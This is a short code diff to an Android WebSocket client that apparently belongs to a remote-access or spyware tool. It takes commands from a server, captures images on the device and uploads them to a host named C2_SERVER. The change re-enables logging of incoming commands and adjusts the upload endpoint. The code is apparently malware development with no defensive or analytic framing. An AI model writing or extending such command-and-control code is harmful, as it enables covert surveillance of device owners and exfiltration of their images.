@@ -1,6 +1,7 @@
 package com.ot.grhq.client;
 
 import android.content.Context;
+import android.os.Handler;
 import android.util.Base64;
 import android.util.Log;
 
@@ -40,7 +41,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
-//        Log.d("eeee", message);
+        Log.d("eeee", message);
         try {
             JSONObject req = new JSONObject(message);
 
@@ -61,7 +62,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     path = Screenshot.captureImage(context, false);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/images");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/image");
 
                     json.put("res", "image");
                     json.put("filename", file.getName());
@@ -72,7 +73,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     path = Screenshot.captureImage(context, true);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/images");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/image");
 
                     json.put("res", "image");
                     json.put("filename", file.getName());
